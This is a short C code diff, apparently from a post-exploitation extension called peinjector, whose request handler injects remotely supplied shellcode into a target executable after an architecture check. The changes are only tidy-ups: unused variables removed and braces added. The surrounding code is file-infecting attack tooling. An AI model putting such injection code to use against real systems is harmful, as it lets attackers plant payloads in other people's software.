@@ -9,9 +9,7 @@
 #include "libpeinfect.h"
 
 void __load_config(PEINFECT *infect, BYTE* shellcode, UINT shellcode_size, bool is_x64) {
-	unsigned char *test_code_x86;
 	size_t test_codesize_x86 = 0;
-	unsigned char *test_code_x64;
 	size_t test_codesize_x64 = 0;
 	PEINFECT_METHOD methods;
 	bool random_section_name = true;
@@ -70,13 +68,13 @@ DWORD request_peinjector_inject_shellcode(Remote *remote, Packet *packet)
 			__load_config(&infect, shellcode, size, is_x64);
 
 			uint16_t arch = get_file_architecture(target_executable_path);
-
 			dprintf("[PEINJECTOR] arch: %d", arch);
-			
+
 			if (!(arch == 0x014c && is_x64 == true || arch == 0x8664 && is_x64 == false)) {
 
-				if (peinfect_infect_full_file(target_executable_path, &infect, target_executable_path))
+				if (peinfect_infect_full_file(target_executable_path, &infect, target_executable_path)) {
 					dprintf("Shellcode injected successfully\n");
+				}
 				else {
 					dprintf("There was an error, shellcode not injected\n");
 					packet_add_tlv_string(response, TLV_TYPE_PEINJECTOR_RESULT, "There was an error, shellcode not injected");
@@ -86,6 +84,7 @@ DWORD request_peinjector_inject_shellcode(Remote *remote, Packet *packet)
 				dprintf("The architecture of the file is incompatible with the selected payload\n");
 				packet_add_tlv_string(response, TLV_TYPE_PEINJECTOR_RESULT, "The architecture of the file is incompatible with the selected payload");
 			}
+
 			packet_transmit_response(dwResult, remote, response);
 		}
 		else
